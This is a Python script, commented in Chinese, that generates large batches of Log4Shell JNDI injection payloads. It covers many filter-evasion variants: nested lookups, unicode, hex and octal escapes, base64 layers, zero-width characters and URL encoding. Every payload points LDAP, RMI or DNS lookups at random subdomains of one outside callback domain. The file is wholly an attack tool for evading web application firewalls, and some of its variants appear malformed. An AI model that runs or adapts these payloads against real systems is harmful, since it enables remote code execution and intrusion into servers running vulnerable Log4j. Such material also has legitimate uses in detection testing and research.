import random
import string
import base64
import re

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_log4shell_payload(bypass_method, custom_jndi=None):
    # 基础的随机域名
    random_domain = generate_random_string() + ".oryrcfntwy.dgrh3.cn"
    
    if bypass_method == "env_lookup":
        return "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//" + random_domain + "}"
    elif bypass_method == "date_lookup":
        return "${${date:MM-dd-yyyy:-j}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "sys_lookup":
        return "${${sys:java.version:-j}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "lower_lookup":
        return "${${lower:J}${lower:N}${lower:D}${lower:I}:ldap://" + random_domain + "}"
    elif bypass_method == "upper_lookup":
        return "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://" + random_domain + "}"
    elif bypass_method == "bundle_lookup":
        return "${${bundle:java.util.logging.config.class:-j}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "java_lookup":
        return "${${java:version:-j}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "main_lookup":
        return "${${main:0:-j}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "marker_lookup":
        return "${${marker:jndi:-j}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "sd_lookup":
        return "${${sd:type:-j}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "spring_lookup":
        return "${${spring:spring.version:-j}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "ctx_lookup":
        return "${${ctx:loginId:-j}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "base64_nested":
        jndi_str = base64.b64encode("jndi:ldap://".encode()).decode()
        return "${${::-j}${base64:${base64:" + jndi_str + "}}://" + random_domain + "}"
    elif bypass_method == "nested_variable":
        return "${${${:-j}${:-n}${:-d}${:-i}}:ldap://" + random_domain + "}"
    elif bypass_method == "script_lookup":
        return "${${script:javascript:java.lang.Runtime.getRuntime():-j}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "dns_lookup":
        return "${${hostName:-j}ndi:dns://" + random_domain + "}"
    elif bypass_method == "web_lookup":
        return "${${web:rootDir:-j}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "nested_lookup_complex":
        return "${${env:NaN:-${env:NaN:-${env:NaN:-j}}}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "double_nested_lookup":
        return "${${env:ENV_NAME:-${sys:os.name:-j}}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "mixed_nested_lookup":
        return "${${date:'MM-dd-yyyy':-${env:USER:-j}}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "unicode_nested":
        return "${${::-\u006a}${::-\u006e}${::-\u0064}${::-\u0069}:ldap://" + random_domain + "}"
    elif bypass_method == "hex_encode":
        return "${${::-j}${::-n}${::-d}${::-i}:${::-\x6c}${::-\x64}${::-\x61}${::-\x70}://" + random_domain + "}"
    elif bypass_method == "octal_encode":
        return "${${::-\152}${::-\156}${::-\144}${::-\151}:ldap://" + random_domain + "}"
    elif bypass_method == "multi_protocol":
        return "${jndi:ldap://127.0.0.1#" + random_domain + "}"
    elif bypass_method == "protocol_bypass":
        return "${${::-j}ndi${::-:}${::-l}dap${::-:}//" + random_domain + "}"
    elif bypass_method == "simple":
        return "${jndi:ldap://" + generate_random_string() + ".oryrcfntwy.dgrh3.cn/a}"
    elif bypass_method == "base64":
        base64_jndi = "aHR0cDovL2V4YW1wbGUuY29tL2E="
        return "${jndi:rmi://attacker.oryrcfntwy.dgrh3.cn/" + base64_jndi + "}"
    elif bypass_method == "uppercase":
        return "${JNDI:LDAP://" + generate_random_string() + ".oryrcfntwy.dgrh3.cn/a}"
    elif bypass_method == "lowercase":
        return "${jndi:ldap://" + generate_random_string() + ".oryrcfntwy.dgrh3.cn/a}"
    elif bypass_method == "mixed_case":
        return "${JnDi:LdAp://" + generate_random_string() + ".oryrcfntwy.dgrh3.cn/a}"
    elif bypass_method == "url_encoded":
        return "%24%7Bjndi%3Aldap%3A%2F%2F" + generate_random_string() + ".oryrcfntwy.dgrh3.cn%2Fa%7D"
    elif bypass_method == "double_encoded":
        return "%2524%257Bjndi%253Aldap%253A%252F%252F" + generate_random_string() + ".oryrcfntwy.dgrh3.cn%252Fa%257D"
    elif bypass_method == "custom_jndi" and custom_jndi:
        return "${jndi:" + custom_jndi + "}"
    elif bypass_method == "separator_bypass":
        return "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${::-" + generate_random_string() + "}.oryrcfntwy.dgrh3.cn/a}"
    elif bypass_method == "multiple_expressions":
        return "${jndi:${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://${lower:" + generate_random_string() + "}.oryrcfntwy.dgrh3.cn/a}"
    elif bypass_method == "special_char_upper_lower":
        return "${jnd\u0131:ld${\u017f:ap}://${::-" + generate_random_string() + "}.oryrcfntwy.dgrh3.cn/a}"
    elif bypass_method == "nested_context_lookup":
        return "${${ctx:${date:MM}:-j}${ctx:${date:dd}:-n}${ctx:${date:yyyy}:-d}${ctx:${date:HH}:-i}:ldap://" + random_domain + "}"
    elif bypass_method == "triple_nested":
        return "${${${:-j}${:-n}${:-d}${:-i}:${:-l}${:-d}${:-a}${:-p}}://" + random_domain + "}"
    elif bypass_method == "mixed_encoding":
        return "${${::-\u006A}${::-\x6E}${::-d}${::-\151}:${::-\x6C}${::-d}${::-\141}${::-p}://" + random_domain + "}"
    elif bypass_method == "reverse_lookup":
        return "${${::-${::-j}}${::-${::-n}}${::-${::-d}}${::-${::-i}}:ldap://" + random_domain + "}"
    elif bypass_method == "base64_obfuscated":
        b64_part1 = base64.b64encode("jn".encode()).decode()
        b64_part2 = base64.b64encode("di".encode()).decode()
        return "${${base64:${base64:" + b64_part1 + "}}${base64:${base64:" + b64_part2 + "}}:ldap://" + random_domain + "}"
    elif bypass_method == "nested_env_complex":
        return "${${env:${sys:${lower:JAVA_VERSION}}:-j}${env:${sys:${upper:user}}:-n}di:ldap://" + random_domain + "}"
    elif bypass_method == "unicode_mixed":
        return "${${::-\u006a}${::-n}${::-\u0064}${::-\u0069}:${::-\u006c}${::-\u0064}${::-\u0061}${::-\u0070}://" + random_domain + "}"
    elif bypass_method == "context_date_mixed":
        return "${${ctx:${date:MM-dd-yyyy:-${env:PATH:-j}}}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "multi_layer_encode":
        return "${${::-${base64:${upper:${lower:j}}}}ndi:ldap://" + random_domain + "}"
    elif bypass_method == "nested_protocol_bypass":
        return "${${::-${::-j}}${::-${::-n}}${::-${::-d}}${::-${::-i}}:${::-${::-l}}${::-${::-d}}${::-${::-a}}${::-${::-p}}://" + random_domain + "}"
    else:
        raise ValueError("Unknown bypass method")

def generate_payloads(num_payloads=100):
    methods = [
        "env_lookup", "date_lookup", "sys_lookup", "lower_lookup", 
        "upper_lookup", "bundle_lookup", "java_lookup", "main_lookup",
        "marker_lookup", "sd_lookup", "spring_lookup", "ctx_lookup",
        "base64_nested", "nested_variable", "script_lookup", "dns_lookup",
        "web_lookup", "nested_lookup_complex", "double_nested_lookup",
        "mixed_nested_lookup", "unicode_nested", "hex_encode",
        "octal_encode", "multi_protocol", "protocol_bypass",
        "simple", "base64", "uppercase", "lowercase",
        "mixed_case", "url_encoded", "double_encoded", "custom_jndi",
        "separator_bypass", "multiple_expressions", "special_char_upper_lower",
        "nested_context_lookup",
        "triple_nested",
        "mixed_encoding",
        "reverse_lookup",
        "base64_obfuscated",
        "nested_env_complex",
        "unicode_mixed",
        "context_date_mixed",
        "multi_layer_encode",
        "nested_protocol_bypass"
    ]
    payloads = []
    for _ in range(num_payloads):
        method = random.choice(methods)
        if method == "custom_jndi":
            custom_jndi = "ldap://" + generate_random_string() + ".oryrcfntwy.dgrh3.cn/a"
            payload = generate_log4shell_payload(method, custom_jndi)
        else:
            payload = generate_log4shell_payload(method)
        payloads.append(payload)
    return payloads

def generate_combined_payload():
    """随机组合多种绕过技术生成更复杂的payload"""
    random_domain = generate_random_string() + ".oryrcfntwy.dgrh3.cn"
    
    # 扩展基础编码方法
    encoding_methods = [
        lambda x: x,  # 普通字符
        lambda x: "\\u00" + hex(ord(x))[2:],  # unicode编码
        lambda x: "\\x" + hex(ord(x))[2:],  # hex编码
        lambda x: "\\" + oct(ord(x))[2:],  # octal编码
        lambda x: base64.b64encode(x.encode()).decode(),  # base64编码
        lambda x: "".join([f"\\u00{hex(ord(c))[2:]:0>2}" for c in x]),  # 全unicode
        lambda x: "${::-" + "".join(reversed(x)) + "}",  # 字符串反转
        lambda x: "".join([f"\\{ord(c)}" for c in x]),  # ASCII编码
        lambda x: base64.b32encode(x.encode()).decode(),  # base32编码
        lambda x: "".join([bin(ord(c))[2:].zfill(8) for c in x])  # 二进制编码
    ]
    
    # 扩展嵌套方法
    nesting_patterns = [
        lambda x: "${::-" + x + "}",
        lambda x: "${env:" + x + ":-" + x + "}",
        lambda x: "${date:MM-dd-yyyy:-" + x + "}",
        lambda x: "${sys:java.version:-" + x + "}",
        lambda x: "${ctx:" + x + ":-" + x + "}",
        lambda x: "${${:-" + x + "}}",
        lambda x: "${${sys:+" + x + "}}",
        lambda x: "${${lower:" + x.upper() + "}}",
        lambda x: "${${upper:" + x.lower() + "}}",
        lambda x: "${${date:ss:" + x + "}}",
        lambda x: "${${env:NaN:-" + x + "}}",
        lambda x: "${${ctx:loginId:-" + x + "}}",
        lambda x: "${${main:" + x + "}}",
        lambda x: "${${:--" + x + "}}",
        lambda x: "${${env:_:-" + x + "}}"
    ]
    
    # 新增协议变体
    protocol_variants = [
        "ldap", "rmi", "dns", "iiop", "http", "corba", "nis", "nds"
    ]
    
    # 新增分隔符变体
    separator_variants = [
        ":",
        "${::-:}",
        "${env:sep:-:}",
        "${${:-:}}",
        "${date::-:}",
        "${sys:path.separator}",
        "${::-${::-:}}",
        "\\u003a",  # 冒号的unicode
        "\\x3a",    # 冒号的hex
        "${${env:NaN:-:}}"
    ]
    
    # 构建基础字符串
    chars = ['j', 'n', 'd', 'i']
    result = []
    
    for char in chars:
        # 随机选择1-4层嵌套
        nested_char = char
        for _ in range(random.randint(1, 4)):
            nested_char = random.choice(nesting_patterns)(nested_char)
        
        # 随机选择是否编码和编码方式
        if random.random() > 0.3:
            nested_char = random.choice(encoding_methods)(char)
            
        result.append(nested_char)
    
    # 随机选择协议
    protocol = random.choice(protocol_variants)
    protocol_chars = list(protocol)
    protocol_result = []
    
    for char in protocol_chars:
        nested_char = char
        if random.random() > 0.5:
            nested_char = random.choice(nesting_patterns)(nested_char)
        if random.random() > 0.5:
            nested_char = random.choice(encoding_methods)(char)
        protocol_result.append(nested_char)
    
    # 构建最终payload
    protocol_part = "".join(result)  # jndi
    separator = random.choice(separator_variants)
    protocol_type = "".join(protocol_result)  # 协议类型
    
    # 随机添加额外的混淆
    if random.random() > 0.5:
        random_domain = "${::-" + random_domain + "}"
    
    # 构建基础payload
    final_payload = "${" + protocol_part + "}" + separator + "//" + random_domain + "}"
    
    # 随机决定是否添加额外的特性
    if random.random() > 0.7:
        # 添加注释字符
        final_payload = final_payload.replace("}", "}<!--}")
    
    if random.random() > 0.8:
        # 添加空格混淆
        final_payload = final_payload.replace("${", "${ ")
        
    if random.random() > 0.7:
        # 添加额外的嵌套层
        final_payload = "${" + final_payload + "}"
        
    if random.random() > 0.9:
        # 添加BASE64整体编码
        final_payload = "${base64:" + base64.b64encode(final_payload.encode()).decode() + "}"
    
    return final_payload

def generate_advanced_payloads(num_payloads=100):
    """生成指定数量的高级混合payload"""
    payloads = set()  # 使用集合去重
    while len(payloads) < num_payloads:
        payload = generate_combined_payload()
        payloads.add(payload)
    return list(payloads)

def generate_effective_payload():
    """生成更有效的payload，同时保持绕过能力"""
    random_domain = generate_random_string() + ".oryrcfntwy.dgrh3.cn"
    
    # 扩展JNDI组件支持DNS
    jndi_components = [
        # 基础协议模式
        lambda: "${jndi:ldap://" + random_domain + "}",
        lambda: "${jndi:rmi://" + random_domain + "}",
        lambda: "${jndi:dns://" + random_domain + "}",
        
        # DNS特定的混淆
        lambda: "${${::-j}ndi:dns://" + random_domain + "}",
        lambda: "${jndi:${::-d}${::-n}${::-s}://" + random_domain + "}",
        lambda: "${${lower:j}${lower:n}${lower:d}${lower:i}:dns://" + random_domain + "}",
        
        # 多协议组合
        lambda: "${jndi:ldap://127.0.0.1#" + random_domain + "}",
        lambda: "${jndi:dns://127.0.0.1#" + random_domain + "}",
        lambda: "${jndi:rmi://127.0.0.1#" + random_domain + "}",
        
        # 协议嵌套
        lambda: "${${env:NaN:-j}ndi:${::-d}ns://" + random_domain + "}",
        lambda: "${jndi:${lower:d}${lower:n}${lower:s}://" + random_domain + "}",
        
        # 高级DNS混淆
        lambda: "${${date:MM-dd:-j}ndi:${sys:java.version:-d}ns://" + random_domain + "}",
        lambda: "${jndi:${base64:ZG5zOi8v}" + random_domain + "}",  # dns:// in base64
    ]
    
    # 扩展混淆方法
    obfuscation_methods = [
        # 基础混淆
        lambda p: p.replace("jndi", "${::-jndi}"),
        lambda p: p.replace("dns", "${::-dns}"),
        lambda p: p.replace("ldap", "${::-ldap}"),
        lambda p: p.replace("rmi", "${::-rmi}"),
        
        # 协议混淆
        lambda p: p.replace(":", "${::-:}"),
        lambda p: p.replace("://", "${::-://}"),
        
        # DNS特定混淆
        lambda p: p.replace("dns://", "d${::-n}s://"),
        lambda p: p.replace("dns", "${env:SHELL:-dns}"),
        
        # 通用编码
        lambda p: p.replace("j", "\\u006a").replace("n", "\\u006e"),
        lambda p: p.replace("d", "\\u0064").replace("s", "\\u0073"),
        
        # 嵌套结构
        lambda p: "${" + p + "}",
        lambda p: p.replace("${", "${ ").replace("}", " }")
    ]

    # 生成基础payload
    base_payload = random.choice(jndi_components)()
    
    # 应用1-2个混淆方法
    num_obfuscations = random.randint(1, 2)
    selected_obfuscations = random.sample(obfuscation_methods, num_obfuscations)
    
    final_payload = base_payload
    for obfuscate in selected_obfuscations:
        final_payload = obfuscate(final_payload)
    
    return final_payload

def generate_effective_payloads(num_payloads=100):
    """生成多个有效的payload"""
    payloads = set()
    while len(payloads) < num_payloads:
        payload = generate_effective_payload()
        payloads.add(payload)
    return list(payloads)

# 添加新的高级但有效的bypass方法
def generate_advanced_effective_payload():
    """生成高级但保证有效性的payload"""
    random_domain = generate_random_string() + ".oryrcfntwy.dgrh3.cn"
    
    # 扩展高级模式
    advanced_patterns = [
        # DNS相关的环境变量绕过
        lambda: "${${env:HOSTNAME:-j}ndi:dns://" + random_domain + "}",
        
        # 多协议组合
        lambda: "${jndi:${::-dns}://${::-" + random_domain + "}}",
        lambda: "${jndi:${lower:d}${lower:n}${lower:s}://" + random_domain + "}",
        
        # 系统属性绕过
        lambda: "${${sys:os.name:-j}ndi:dns://" + random_domain + "}",
        
        # 日期格式绕过
        lambda: "${${date:MM-dd:-j}${date:HH:mm:-n}di:dns://" + random_domain + "}",
        
        # Base64编码绕过
        lambda: "${jndi:${base64:ZG5zOi8vfA==}}" + random_domain + "}",  # dns://| in base64
        
        # Unicode混淆
        lambda: "${${::-\\u006a}${::-\\u006e}${::-\\u0064}${::-\\u0069}:${::-\\u0064}${::-\\u006e}${::-\\u0073}://" + random_domain + "}",
        
        # 协议嵌套
        lambda: "${jndi:${${::-d}${::-n}${::-s}}://" + random_domain + "}",
        
        # 多层协议
        lambda: "${jndi:dns://127.0.0.1%23" + random_domain + "}",
        
        # 混合协议
        lambda: "${jndi:${env:JAVA_VERSION:-dns}://" + random_domain + "}"
    ]
    
    return random.choice(advanced_patterns)()

def generate_super_bypass_payload():
    """生成更高级的绕过payload"""
    random_domain = generate_random_string() + ".oryrcfntwy.dgrh3.cn"
    
    # 高级绕过技术
    advanced_bypass = [
        # 1. 使用XML注释干扰WAF分析
        lambda: "${jndi:<!--*/-->ldap://" + random_domain + "}",
        
        # 2. 使用特殊字符集绕过
        lambda: "${${::-\u24ba}\u24b6\u24b9\u24b8:ldap://" + random_domain + "}",  # 圆圈字母
        
        # 3. 使用零宽字符混淆
        lambda: "${j\u200Bndi\u200B:ldap://" + random_domain + "}",  # 零宽空格
        
        # 4. 使用多重编码
        lambda: "${${base64:${upper:${base64:${lower:${base64:amRuaQ==}}}}}}:ldap://" + random_domain + "}",
        
        # 5. 使用数学表达式
        lambda: "${${::-${::-${{7*7}}}}ndi:ldap://" + random_domain + "}",
        
        # 6. 使用条件表达式
        lambda: "${${sys:java.version<?:}jndi:ldap://" + random_domain + "}",
        
        # 7. 使用异常处理绕过
        lambda: "${${::-j}${try:main:-ndi}:ldap://" + random_domain + "}",
        
        # 8. 使用Unicode变体
        lambda: "${${::-\uFF4A}\uFF4E\uFF44\uFF49:ldap://" + random_domain + "}",  # 全角字符
        
        # 9. 使用多重转义
        lambda: "${${:\\u006a}${:\\u006e}${:\\u0064}${:\\u0069}:ldap://" + random_domain + "}",
        
        # 10. 使用嵌套表达式和运算符
        lambda: "${${sys:+:-j}${date:+:-n}${main:+:-d}${:+:-i}:ldap://" + random_domain + "}",
        
        # 11. 使用Look-ahead/Look-behind模式
        lambda: "${${env:?:-j}${env:?:-n}${env:?:-d}${env:?:-i}:ldap://" + random_domain + "}",
        
        # 12. 使用递归引用
        lambda: "${${:-${:-${:-j}}}${:-${:-${:-n}}}di:ldap://" + random_domain + "}",
        
        # 13. 使用特殊协议组合
        lambda: "${jndi:${::-l}d${::-a}p${::-:}${::-/}/${::-/}" + random_domain + "}",
        
        # 14. 使用混合编码
        lambda: "${${::-\\x6A}${::-\\u006E}${::-\\144}${::-\\151}:ldap://" + random_domain + "}",
        
        # 15. 使用环境变量嵌套
        lambda: "${${env:${lower:${upper:PATH}}:-j}ndi:ldap://" + random_domain + "}",
        
        # 16. 使用日期格式化绕过
        lambda: "${${date:ss:->j}${date:ss:->n}di:ldap://" + random_domain + "}",
        
        # 17. 使用特殊URL编码组合
        lambda: "${jndi:ldap://127.0.0.1%252523" + random_domain + "}",
        
        # 18. 使用HTTP头注入技术
        lambda: "${jndi:ldap://" + random_domain + "}<!--${::-X-Forwarded-For}-->",
        
        # 19. 使用Base64变体编码
        lambda: "${jndi:${base32:MZXW6YTBOI======}://" + random_domain + "}",
        
        # 20. 使用Unicode规范化绕过
        lambda: "${${::-\u24D9\u24D4\u24D3\u24D8}:ldap://" + random_domain + "}"  # 带圈小写字母
    ]
    
    # 附加混淆层
    obfuscation_layers = [
        # 1. 添加随机注释
        lambda p: p.replace(":", "<!--random-->::<!--random-->"),
        
        # 2. 添加无害字符
        lambda p: p.replace("${", "${/**/"),
        
        # 3. 使用特殊空白字符
        lambda p: p.replace(" ", "\u2000"),  # 使用特殊空格
        
        # 4. 添加无效嵌套
        lambda p: p.replace("jndi", "${::-}jndi${::-}"),
        
        # 5. 使用条件运算符
        lambda p: "${" + p + ":-" + p + "}"
    ]
    
    # 生成基础payload
    base_payload = random.choice(advanced_bypass)()
    
    # 随机应用0-2层混淆
    num_layers = random.randint(0, 2)
    if num_layers > 0:
        selected_layers = random.sample(obfuscation_layers, num_layers)
        for layer in selected_layers:
            base_payload = layer(base_payload)
    
    return base_payload

def generate_super_bypass_payloads(num_payloads=50):
    """生成多个高级绕过payload"""
    payloads = set()
    while len(payloads) < num_payloads:
        payload = generate_super_bypass_payload()
        payloads.add(payload)
    return list(payloads)

if __name__ == "__main__":
    print("生成有效的Payload：")
    # 混合使用两种生成方法
    payloads = []
    for _ in range(50):
        if random.random() > 0.5:
            payloads.append(generate_effective_payload())
        else:
            payloads.append(generate_advanced_effective_payload())
    
    for i, payload in enumerate(payloads, 1):
        print(f"Payload {i}: {payload}")

    print("生成高级绕过Payload：")
    payloads = generate_super_bypass_payloads(50)
    for i, payload in enumerate(payloads, 1):
        print(f"Payload {i}: {payload}")
